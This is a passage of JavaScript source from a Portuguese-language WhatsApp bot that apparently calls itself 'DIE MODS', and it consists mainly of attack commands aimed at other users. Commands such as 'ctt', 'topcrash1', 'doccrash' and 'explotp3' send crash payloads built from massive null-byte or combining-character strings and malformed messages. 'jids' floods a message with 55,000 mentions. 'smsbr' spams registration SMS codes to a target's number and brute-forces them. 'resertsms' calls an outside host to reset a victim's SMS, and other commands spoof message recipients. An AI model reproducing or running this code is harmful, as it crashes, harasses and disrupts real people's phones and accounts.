  enviar("\n\nAgora, os contatos que lhe enviarem mensagens terão suas mensagens automaticamente apagadas.\n\n");
  break;
  case 'statusdelete':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
  enviar(`\n\n A função de deletar mensagem dos outros está em ${funcaodeapagar} \n\n`)
  break
  case 'offdeleteall':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
config.funcaoapagar = false
await fs.writeFileSync("./config.json", JSON.stringify(config, null, 2))
enviar(`\n\n Pronto agora Todas as mensagens que você ira receber não serão apagadas para os outros\n\n`)
break
  case 'menutel':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
  const argsSeparated2 = args.join(' ').split('|');
  const c = argsSeparated2[1];
  const c2 = argsSeparated2[2];
  const c3 = parseInt(argsSeparated2[3]);
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono ©️ ");
  if (args.length < 1) return enviar(`\n\nExemplo: ${prefixo + command} |(alvo)|(mensagem)| (quantidade de chats)\n\n`);
  trix.pollBtn(from, `🔥 ~ ~ ~ Menu exploit ~ ~ ~🚀`, [
    { vote: '️🔍𝐉𝐢𝐃͢𝐒 𝚫𝐋𝚵𝚫𝐓𝐎͢𝐑𝐢𝜭𝐒', cmd: `${prefixo}explot |${c}|${c2}|${c3}` },
    { vote: '️️🐱 𝚵𝐍𝐕𝐢𝚫𝐑 𝐏𝚫𝐑𝚫 𝐌𝐢𝐍', cmd: `${prefixo}exploitme |${c}|${c2}` },
    { vote: '️🔍 𝐏𝚵𝐑𝐒𝐎𝐍𝐀𝐋𝐢𝐙𝐀𝐃𝐎', cmd: `${prefixo}menuexploit ${c}` }
  ]);
  break;
  case 'menutel22':
    if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
    trix.pollBtn(from, `🔥 ~ ~ ~ Menu exploit ~ ~ ~🚀`, [
    { vote: '️🔍𝐉𝐢𝐃͢𝐒 𝚫𝐋𝚵𝚫𝐓𝐎͢𝐑𝐢𝜭𝐒', cmd: `${prefixo}explot` },
    { vote: '️️🐱 𝚵𝐍𝐕𝐢𝚫𝐑 𝐏𝚫𝐑𝚫 𝐌𝐢𝐍', cmd: `${prefixo}exploitme` },
    { vote: '️🔍 𝐏𝚵𝐑𝐒𝐎𝐍𝐀𝐋𝐢𝐙𝐀𝐃𝐎', cmd: `${prefixo}menuexploit ` }
  ]);
  break;
  case 'menu2':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
    trix.pollBtn(from, `┏✦ࠫ✩͡ ✦ ᳕ՙ 𝐌𝚵𝐍͢𝐔 𝐃𝐎 𝐂𝐋𝐢͢𝚵𝐍𝐓 ᳕▵͡✰✦ࠫ┓`, [
    { vote: '️🌏 ▢ 𝐂𝐑𝐀ࠫ𝐒𝐇 ▣ 📡', cmd: `${prefixo}menucrash ` },
    { vote: '️️┏▢✦ ▣ 𝚵𝚾ࠫ𝐏͢𝐋࠙𝐎𝐢𝐓 ▣ ✦▢┓', cmd: `${prefixo}menutel22 ` },
    { vote: '️┏▼┉  𝐒𝐌ࠫ𝐒 ┉▼┓', cmd: `${prefixo}smsmenu ` }
  ]);
  break
  case 'smsmenu':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
      trix.pollBtn(from, `┏✦ࠫ✩͡ ✦ ᳕ՙ 𝐌𝚵𝐍͢𝐔 𝐃𝚵 𝐒𝐌ࠫ𝐒 ᳕▵͡✰✦ࠫ┓`, [
    { vote: '️🌏 ▢ 𝐒𝐌ࠫ𝐒 𝐀𝐋ࠫ͢𝐋 ▣ 📡', cmd: `${prefixo}smsinternacionalif ` },
    { vote: '️️┏▢✦ ▣ 𝐒𝐌ࠫ𝐒 𝐁͢𝐑 ▣ ✦▢┓', cmd: `${prefixo}smsbr ` },
    { vote: '️️️┏▢✦ 𝐑𝚵͢𝐒𝚵𝐓 𝐒𝐌͢𝐒 ✦▢┓ ', cmd: `${prefixo}resertsms ` }
  ]);
  break
  case 'del2':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
  const stanzaId = info.message.extendedTextMessage.contextInfo.stanzaId;
  const participant = info.message.extendedTextMessage.contextInfo.participant;
  
  const deleteMessage = {
    delete: {
      remoteJid: from,
      fromMe: true,
      id: stanzaId,
      participant: '1@s.whatsapp.net',
      type: 'REVOKE',
      participant: participant
    }
  };
  
  const msg = await baileys.generateWAMessage(from, deleteMessage, {});
  
  trix.relayMessage(from, msg.message, {
    additionalAttributes: {
      recipient: state.creds.me.id.split(':')[0] + '@s.whatsapp.net',
      edit: '7'
    }
  });
  break;
  
    case 'menuexploit':
     if (!isOwner && !info.key.fromMe) return enviar("\n\nSo meu dono 🔥\n\n ")
     if (args.length < 1) return enviar(` \nExemplo: ${prefixo + command} (alvo) \n `);
    const ccop = args.join(' ')  + '@s.whatsapp.net'
    const cc9 = args.join(' ');
     trix.pollBtn(from, `🚘 ~ ~ FUNÇÕES APELATIVAS PERSONALIZADAS ~ ~ 🔍`, [
      { vote: '️👤 US3R ESPECÍFICO ⭐ ~ ࡆ 🛒', cmd: `${prefixo}especif ` },  { vote: '️◀️ ߖ 𝐂𝚫𝐑𝐑͢𝐢𝐍𝐇𝜭 𝟐͢𝟓𝐗 ~ ࡆ 🛒', cmd: `${prefixo}explotp ${ccop}` },
    { vote: '️~ 📅 [𝐂𝚫𝐋𝚵𝐍͢𝐃𝚫𝐑𝐢𝐎 𝟐𝟓𝜲]  ~', cmd: `${prefixo}explotp3 ${ccop}` },     { vote: '~📍[𝟐𝟓𝜲] LINK CALL ~', cmd: `${prefixo}explotp2 ${ccop}` },    { vote: '~ EXPLOIT BIG< ~', cmd: `${prefixo}exploitfrom ` },  { vote: '📩 𝐑𝚵𝐒𝚵𝐑𝐓 𝐒𝐌𝐒 ⭐ ', cmd: `${prefixo}resertsms ${cc9}` },{ vote: '~ 🌏 BUG𝚫R C0D𝚵 ~', cmd: `${prefixo}smsinternacional` },{ vote: '~ 🇧🇷 BUG𝚫R C0D𝚵 ~', cmd: `${prefixo}smsbr ${ccop}` },
  ]);
 break
 
    case 'especif':
      if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono ©️\n\n ");
if(!text.split('|')[3]) return enviar(`\n\n exemplo: você deve colocar ${prefixo + command} numero|numero2|quantidade|mensagem\n\n`)
for(let i = 0; i < text.split('|')[2]; i++) {

await trix.relayMessage(text.replace(new RegExp("[()+-/ +/]", "gi"), "").replace("@", '').split('|')[0] + "@s.whatsapp.net", {
  "conversation": text.split('|')[3]
}, {additionalAttributes: { recipient:text.replace(new RegExp("[()+-/ +/]", "gi"), "").replace("@", '').split('|')[1] + "@s.whatsapp.net"}})
}
enviar("pronto")
break
  case 'explotp3': {
     if (args.length < 1) return enviar(` \nExemplo: ${prefixo + command} (alvo) \n `);
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono ©️\n\n ");
  cu = "Trix and kalzin";
for (let i = 0; i < 60000; i++) {
  cu += `\u0901`}
cu += "";
  if (args.length < 1) return enviar(`Exemplo: ${prefixo + command} (alvo)\n`);
    const cmc = args.join(' ')
  for (let i = 0; i < 25; i++) {
    const euamotravecodnv = Math.floor(Math.random() * 9999);
 await   trix.relayMessage(cmc, {
 scheduledCallCreationMessage: {
        "scheduledTimestampMs": Date.now() + 60000 ,
      "callType": "VIDEO",
      "title": "𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  " + cu  }}, {
      additionalAttributes: { recipient: `554199${euamotravecodnv}228@s.whatsapp.net` }
    });
  }}
  break;
  

  case 'exploitfrom':
     if (args.length < 1) return enviar(` \n\nExemplo: ${prefixo + command} (texto)\n\n `);
    if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono ©️ \n\n ");
                let verseessamacumbapresta = (args[1] || info.key.remoteJid.split('@')[0]) + '@s.whatsapp.net';
  if (args.length < 1) return enviar(`Exemplo: ${prefixo + command} (texto que você quer enviar)\n`);
    const travecodokilla = args.join(' ')
  for (let i = 0; i < 15; i++) {
    const euamotravecodnv9999 = Math.floor(Math.random() * 9999);
 await   trix.relayMessage(verseessamacumbapresta, {
"extendedTextMessage":{
"text": travecodokilla,
   "previewType": "NONE",
  "inviteLinkGroupTypeV2": "DEFAULT"
}},{
      additionalAttributes: { recipient: `554199${euamotravecodnv9999}228@s.whatsapp.net` }
    });
  }
  break;
  

case 'jids':
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono ©️ ");
const sexuanal = Math.floor(Math.random() * 99999);
  let cu99 = [];
  for (let i = 0; i < 55000; i++) {
    cu99.push(`558398${sexuanal}@s.whatsapp.net`);
  }


  cu99.unshift(`558398${sexuanal}@s.whatsapp.net`); // Adicionar o primeiro ID mencionado


    await trix.sendjson(from, {
      "extendedTextMessage": {
        "text": "Kalzin and Trix",
        "previewType": "NONE",
        "contextInfo": {
          "mentionedJid": cu99
        },
        "inviteLinkGroupTypeV2": "DEFAULT"
      }
    });
  break;
  case 'smsbr': {
if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
  if (args.length < 1) return enviar(`Exemplo: ${prefixo + command} (alvo) \n`);
  for (let i = 0; i < 10; i++) {
    const kibj11 = args.join(' ');
    numi22 = kibj11.replace('55'+ '+', '');
    numi99 = numi22.replace('@s.whatsapp.net', '');
    const { state2222, saveCreds2222 } = await useMultiFileAuthState('./kalzinplug/pluglin');
    
    try {
      cu19 = await trix.requestRegistrationCode({
        phoneNumber: '+55' + `${numi99}`,
        phoneNumberCountryCode: '55',
        phoneNumberNationalNumber: `${numi99}`,
        phoneNumberMobileCountryCode: 724,
        method: 'sms'
      });
      enviar("SMS Solicitado pedirei novamente em: " + cu19.retry_after + " Segundos");
    } catch(err) {
    }
  }
  for (let i = 0; i < 10000; i++) {
    try {
      var euamotraveco12 = Math.floor(Math.random() * 999);
      var euamotraveco24 = Math.floor(Math.random() * 999);
      await trix.register(`${euamotraveco12}-${euamotraveco24}`);
    } catch(err) {
      console.log(`${euamotraveco12}-${euamotraveco24}`);
    }
  }
}
break;
  case 'novamsg':
    for (let i = 0; i < 25; i++) {
   trix.sendjson(from,{"protocolMessage":{"type":"HISTORY_SYNC_NOTIFICATION","historySyncNotification":{"fileSha256":"A8gAeHtYIoprUjakiT1YllIEvuLRbuCjDkQPwVhEIQg=","fileLength":"999999","mediaKey":"+z615gjdPjp8UL8GkDkoHSjNSV34a7zucRh4qUXItUw=","fileEncSha256":"TgSwGKYuXnySi7Ah3OFYhit+jziReiuSiqZKdDR+zQ0=","directPath":"/v/t62.31111-24/29502339_3572772869716935_5989683349868199031_n.enc?ccb=11-4&oh=01_AdTv6csMmtVFYwhTZi8mXJpfARaLepwZj0Wbvu9BwyF01w&oe=650044DA","syncType":"RECENT","chunkOrder":2,"progress":100}}},{quoted: crash})}
  break
case 'explotp2': {
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono ©️ ");
  if (args.length < 1) return enviar(`Exemplo: ${prefixo + command} (alvo)\n`);
    const cmcc = args.join(' ')
  for (let i = 0; i < 25; i++) {
    const euamotravecodnv = Math.floor(Math.random() * 9999);
 await   trix.relayMessage(cmcc, {
 "extendedTextMessage":{"text":"https://call.whatsapp.com/video/KALZINANDTRIX","matchedText":"https://call.whatsapp.com/video/KALZINANDTRIX","description":"🚀 ~ ~ ~ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ~ ~ ~ ☠️","title":"🥥 ~ ~  ~ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 x  ~ ~ ~ 🌌 ","previewType":"NONE","inviteLinkGroupTypeV2":"DEFAULT" }}, {
      additionalAttributes: { recipient: `554199${euamotravecodnv}228@s.whatsapp.net` }
    });
  }}
  break;
  
  case 'bugk':
      if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n")
   trix.sendjson(from,{"extendedTextMessage":{"text":"*❤️‍🔥 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞  ❤️‍🔥*","previewType":"NONE","contextInfo":{"forwardingScore":9127,"isForwarded":true,
        externalAdReply: {
        title: null,
        body: null,
   showAdAttribution: true,
        thumbnail: null,
        mediaUrl: "kalzin.setings",
        sourceUrl: "kalzin.828.com",
        "inviteLinkGroupTypeV2":"DEFAULT"}}}},{quoted: crash})
  await delay(2000)
  trix.sendjson(from, {
  "extendedTextMessage": {
   "text": "𝗗𝗜𝗘 𝗕𝗔𝗖𝗞  "
   }},{quoted: cr});break

//By kalzin OwO
     case 'crashios':
       if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n")
    trix.sendjson(from,{"locationMessage":{"degreesLatitude":61.87545968924676,"degreesLongitude":-116.13551706075667,"name":pontocrash(prefixo),"address":pontocrash(prefixo)}})
     break
     
  case 'explotp':   
      if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n")
  if (args.length < 1) return enviar(`Exemplo: ${prefixo + command} (alvo) \n`);
  const cc = args.join(' ') 
  for (let i = 0; i < 25; i++) {
    const euamotravecodnv = Math.floor(Math.random() * 9999);
    trix.relayMessage(cc, {
      orderMessage: {
        itemCount: 1, // Cambié el valor negativo a 1, ya que no puede haber un número negativo de artículos
        message: '𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞',
        orderId: 'ID_del_pedido', // Agrega un ID de pedido válido si es necesario
        orderTitle: '𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   ',
        totalAmount1000: 1000, // Cambié el valor a 1000, asumiendo que es el monto total en centavos
        totalCurrencyCode: 'BRL',
        thumbnail: thumb
      }
    }, { additionalAttributes: { recipient: `554199${euamotravecodnv}228@s.whatsapp.net` } });
  }
  break;
  case 'resertsms':
     if (args.length < 1) return enviar(` \n\nExemplo: ${prefixo + command} (numero) \n\n `);
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  const numerodogay = args.join(' ') 
  const numero = numerodogay.replace('@c.us', + '+', ''); // Extrai o número do remetente da mensagem

  try {
    const response = await axios.get(`https://rest.chronisch1337.repl.co/resetsms/${numero}`);
    console.log(response.data);
    // Processar a resposta recebida aqui, de acordo com as necessidades do seu código
    return enviar( 'Solicitação enviada com sucesso!');
  } catch (error) {
    console.error(error);
    // Tratar erros de solicitação aqui, se necessário
return enviar( 'Ocorreu um erro ao enviar a solicitação.');
  }
  break;
case 'explot':
  if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n");
     if (args.length < 1) return enviar(` \n\nExemplo: ${prefixo + command} |(numero) | (texto) | (numeros dechats)\n\n `);
  const argsSeparated = args.join(' ').split('|');
  const c1 = argsSeparated[1] + '@s.whatsapp.net';
  const c22 = argsSeparated[2];
  const c33 = parseInt(argsSeparated[3]);

  for (let i = 0; i < c33; i++) {
    const euamotravecodnv = Math.floor(Math.random() * 9999);
    trix.relayMessage(c1, {
      conversation: c22
    }, {
      additionalAttributes: {
        recipient: `554199${euamotravecodnv}228@s.whatsapp.net`
      }
    });
  }
  break;
  case 'topcrash1':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
let cu336 = " ~ ~ ~ 🦄 R e a l C R a s H 🌠 ~ ~ ~ ";
for (let i = 0; i < 95000; i++) {
  cu336 += "\u0000\u0000\u0000\u0000\u0000";
}
cu336 += "";
  frase = '🦠 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   Client';
  trix.sendMessage(from, {
    text: "🛒 ~ ~ ~ CRASH THE VOID ~ ~ ~ 💩 ",
      "contentText": "Escolha uma opção:"
  }, {
    quoted: {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        mentions: true,
        remoteJid: "status@broadcast",
        mentionedJid: ['5583998140301-1625944593@g.us']
      },
      message: {
        listMessage: {
          title: `[ ~ ~ ~ 𝐑𝚵͢𝚫𝐋 𝐂𝐑𝚫𝐒͢𝐇 ~ ~ ~ ]${cu336}`,
          description: ` 🔥 ~ ~ ~ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ~ ~ ~ 🚀`,
          buttonText: "𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ",
          listType: "PRODUCT_LIST",
          productListInfo: {
            productSections: [{
              title: "LIST_CATALOG",
              products: [{
                productId: "4120139628109348"
              }]
            }],
            headerImage: {
              productId: "5512997675520",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPgMBIgACEQEDEQH/xAAuAAABBQEAAAAAAAAAAAAAAAAFAAECAwYEAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAANHJnKRXSBujBfIamrk6zlnZyGV1uTW4sJ7QyoyShWTl5Mxr6DNkDvFXcmdBvQOtCsAlgaQygNoNedE0iLpDxSHdI//EACcQAAICAQMDBAIDAAAAAAAAAAECAAMRBBASEyEyBSIxUSNSFDNx/9oACAEBAAE/AF8RMS61KV5NH9W92EqlHqYtcK642xMRfEbeo1Nai4iEdXhZnAlnmOPxntNOHFSczk43XxG1gJQ4mpThqT9mW1/jDCaHUM6BH8t18RvrLhbq3I+BOp+PE0B51EjyQxDyUHYKAo90/wAJlnMqQA3xGpsFpTieWZbTqaly1ZxPSVJLwDA2RAANrFZhhTiV6YK/Nu7RlDAgjIi6Q1MTW2BBnHfZdVebjSKhkCUanqWPUy8XWZA+SJZalS8nbAgZSM5EyPvYEH4M7trn42cfZNK4pttW3+z9vuX2LZVZYgOQexJmrxboqWPc9pdXX/Efpnvxl9iHQ1Hn7xiai1y2mXPsI7mUVlbiVsGCPERUq7NxGYVrY5IBM6dP6Cca+PHiMfUVa1GAABOlT+izjWV48RiKta+IAn//xAAXEQEBAQEAAAAAAAAAAAAAAAABEQAw/9oACAECAQE/ANCW5CCPBeX/xAAbEQEAAgIDAAAAAAAAAAAAAAABABEQICEwQf/aAAgBAwEBPwCAMTN8aUVAv3q//9k=",
              scansSidecar: "8+Falb5f5QSYWAsuzUMGTGoE6H+YhMRCKX3f0NHqXOf7BIiuMYiVsQ==",
              scanLengths: [999999999, 9999999, 99999999, 9990],
              midQualityFileSha256: "CPwmEYeSZiQlg7HyIgV1HbHLPJ8ymqZhxxFWs5+xWH8="
            },
            businessOwnerJid: `5583998140301@s.whatsapp.net`,
            listMessage: {
              header: {
                hasMediaAttachment: true,
                locationMessage: {
                  degreesLatitude: 1.2348753517826312,
                  degreesLongitude: -31.82241802860517
                }
              }
            }
          }
        }
      }
    }
  });
  break;
  
case 'exploitme':
   if (args.length < 1) return enviar(` \nExemplo: ${prefixo + command} | (alvo)| (mensagem )\n `);
if (!isGroup) return enviar('Este comando só pôde ser usado em grupos')
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
    const argsSeparated9 = args.join(' ').split('|');
  const c9 = argsSeparated9[1] + '@s.whatsapp.net';
  const c29 = argsSeparated9[2];
trix.relayMessage(c9, 
      {
  "conversation": c29
}
    , {
      additionalAttributes: {
        recipient: sender
      }
    });
    break
  
//By kalzin OwO
  case 'menucrash':
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
  trix.pollBtn(from, `╭━━━ ↔️ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   x  𝗘𝗬𝗣𝗭 𝗚𝗢𝗗  ━━━╮️`, [{ vote: `🛒 ️𐎟 BUG C𝚫RT`, cmd: `${prefixo}cartbug` }, { vote: '🛒 ️𐎟 C𝚫RT BUG 2 (𝜭P) ☠️️️', cmd: `${prefixo}cutecart` },{ vote: '🐢 ️𐎟 ~ ~ ~ JIDS ~ ~ ~☠️️️', cmd: `${prefixo}jids` },{ vote: '📩 ️𐎟 INVITE BUG  (𝜭P) ☠️️️', cmd: `${prefixo}invitecrash` }, { vote: `☎️ 𐎟 F I G U C R 𝚫 S H 🕵️`, cmd: `${prefixo}figucrash` }, { vote: `❤️‍🔥 𐎟 TEXT𝜭 C R 𝚫 S H 😴️`, cmd: `${prefixo}bugk` },  { vote: `❤️‍🔥 𐎟 V C 𝚫 RD C R 𝚫 S H 👥️`, cmd: `${prefixo}ctt` }, { vote: `💣 𐎟 L 𝜭 C C R 𝚫 S H 📍`, cmd: `${prefixo}ctt` }, { vote: `🍏 𐎟 L 𝜭 C C R 𝚫 S H ☠️`, cmd: `${prefixo}crashios` },{ vote: `📩 𐎟 I N V I T E C R 𝚫 S H ☠️(2) `, cmd: `${prefixo}quotedbug` }, { vote: `👀 𐎟 C A T A L O G C R 𝚫 S H ☠️`, cmd: `${prefixo}crashcatalogo` },  { vote: `❤️‍🔥 𐎟 D 𝜭 C U M E N T 𝜭 C R 𝚫 S H 🗃️️`, cmd: `${prefixo}doccrash` }]);
  break;
  case 'loccrash':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
   trix.sendjson(from,{"locationMessage":{"degreesLatitude":61.87545968924676,"degreesLongitude":-116.13551706075667,"name":"😈 ꪶ☘︎𝜩𝑀𝐵𝐼𝑅͢𝐸 𝜧𝜭𝑫𝑺☘︎ꫂ ✦ 💁🏽‍♂️"+ k9,"address":"🛒 ~ ~ ~ CRASH THE VOID ~ ~ ~ 💩 "}},
    {quoted: crash})
    await delay(2000)
  trix.sendjson(from, {
  "extendedTextMessage": {
   "text": "😈 𝗗𝗜𝗘 𝗕𝗔𝗖𝗞 "
   }},{quoted: cr});break

  case 'doccrash':
    if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
  trix.sendjson(from,{"documentMessage":{"url":"https://mmg.whatsapp.net/v/t62.7119-24/34833988_1014914913181359_5584764860227180542_n.enc?ccb=11-4&oh=01_AdRgAOwVX8focA63UUag0omcABQa0F17jQi_N4KKFqfXbA&oe=64FF01A3&mms3=true","mimetype":"text/vcard","title":"Kalzin","fileSha256":"LXI02h0utYuCG6A4FLinyUX1LBKD96SekbT3Qv/6IVU=","fileLength":"1695964","pageCount":9999999,"contactVcard":true,"mediaKey":"CHcupM2pNBrpn1z7tEOSfMB2E/3gy6831EINCArQaJA=","fileName":"😈 THE CRASH OP ","fileEncSha256":"pfDOl9wrAWyqgHcI6dbTM9BeBwQeuXENxVlq70GdKhM=","directPath":"/v/t62.7119-24/34833988_1014914913181359_5584764860227180542_n.enc?ccb=11-4&oh=01_AdRgAOwVX8focA63UUag0omcABQa0F17jQi_N4KKFqfXbA&oe=64FF01A3&_nc_hot=1691842384","mediaKeyTimestamp":"1691842357","thumbnailDirectPath":"/v/t62.36145-24/25268256_638187624736672_7080615571441891898_n.enc?ccb=11-4&oh=01_AdTCWbpT-I8sKNvjLvhXYVUG6nyFX-ndmSk8rMdQNuDVww&oe=64FEF6DA","thumbnailSha256":"D3lM+mdfyZSVHIXpTNcHF9ICjjmKWAfNNjcvBMB757E=","thumbnailEncSha256":"napH9WaDbijqJwbk5c0p6DE9MD1+hr4fIOjv2fbzzDg=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIADYAYAMBIgACEQEDEQH/xAAuAAADAQEBAQAAAAAAAAAAAAAAAgMBBAUGAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAPqy6gzxYXw5dW2hWVomRbFnXXmrU24ezWX5enkzpLoFtZbW05qr08PfjnjOsSaWzOuC1Ijm4lW0aG88Jl2gbk4axVwhmCpAF//EAC8QAAICAQMCBAUCBwAAAAAAAAECABEDEiExBFEQEyJBI0NhcYE0U0JScpGhorL/2gAIAQEAAT8Az5M6Nabj+kmI+ZlGr/kiIXvfipYhELADeanZgQLB4o8CAaQbuY8mokLwNge810aPPgWAjtkB9KBhXeoXy/tX+Zrzfs/7RWcnfHX1uG951OUoBttRsjcg/aY8iDTbkl91B2MI1CBRRHtcsggBdu83qydpjxlCTZN77714EhQSTQAszzcex8wUeJqDD0kHwyGjrqyGmYaRqC6mDbV7XEYleaMTIWLAHe+TENiyK3gHmIoYUffSeKhvwZQylSLBmRcaZNI6ZiO4uY8aYwQooQ12jAnzPYkkC+IMqH4L7P27/URARpTQAKoGMq6txte/43EKY1LMDpLcm9jFvHrILOWNwl/Zv7iMLUjuIvSZVFDqGq7nkZq/UNcXp8q/OJmJGRAGfUe8yAiyBqB9rjKnnotW+kmVXrA+/wBouRS7DUxbaXjTmgpP+THRAlg0F3HaOC4Aciu3jY7y5Y7iHggVHBVGN8CKxLEhvSRxMvTjLdkixMXTlFALaiOSbii1KPV1DpaxHTKxsMB+TM4zDqsA8w17i+ZkfJb/ABP4v5RMuDJl+ZQIBmPo2R0Y5AaPaY+nf4wL7ljuJiwNjJJyFvoZal9Nb1f0hqrqUI+LXW9V2ioqKNNi5//EAB0RAQACAgIDAAAAAAAAAAAAAAEAIBESQXGR0fD/2gAIAQIBAT8A2+xB78WQDmopNmrME90//8QAHxEBAAEDBAMAAAAAAAAAAAAAAQAQETECQVFhEiEi/9oACAEDAQE/APnu8uUYVFWlrVQZ4lFxPSZne8Acx1Lxjgm9tpYK/wD/2Q==","thumbnailHeight":270,"thumbnailWidth":480}}, {quoted: crash})
    await delay(2000)
  trix.sendjson(from, {
  "extendedTextMessage": {
   "text": "😈 雨 ⃪𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ⃪サンダ 🕺"
   }},{quoted: cr});break
   
case 'ctt':
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
//by kalzin praque encher a index de trava ou ter o trabalho de criar uma pasta js kkkkk
let cu3 = "ᯭ ᯮ 𝐍𝟄𝝌⌰𝑺 Op 🐲 𝐛𝐲 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 🇩🇪 🦅 ";
for (let i = 0; i < 55000; i++) {
  cu3 += "\u0000\u0000\u0000\u0000\u0000";
}
cu3 += "";
const crashkalzin = trix.sendjson(from, {
  "contactMessage": {
    "displayName": "🦧𝐊𝐀𝐋𝐙𝐈𝐍 And ႂ ེ𝟆𝟄𝝌ཽ𝑺 🐰؋ྺ྄᭫ࠫͫ̀ՙ᠉\n👍🏻ྀྀ\nྀྀ\nྀྀ\nྀྀྀྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ\nྀྀ",
    "vcard": `BEGIN:VCARD
VERSION:3.0
N:┏┛✦༑𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞༑✦┗┓ ${cu3}
FN:ՙ🍎྆Ͳ𝐇࿆𝚵 𝐂𝚛͢𝚫֜𝐒𝐇 𝚒𝙾͢𝚂྆̆̆̆̌̌
ORG:┏┛✦༑𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞༑✦┗┓
TEL;waid=558398140301:+55 83 9814-0301
X-ABLabel:Celular
X-WA-BIZ-DESCRIPTION:ႂ ེ𝟆𝟄𝝌ཽ𝑺 ؋ྺ྄᭫ࠫͫ̀ՙ
X-WA-BIZ-NAME:┏┛✦༑𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞༑✦┗┓
END:VCARD`,
    contextInfo: {
        showAdAttribution: true
      }
    }
}, {quoted: crash})
  await delay(2000)
  trix.sendjson(from, {
  "extendedTextMessage": {
   "text": "😈 ✦ ꪶ☘︎𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞🇩🇪 "
   }},{quoted: cr});break
case 'invitecrash':
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man")
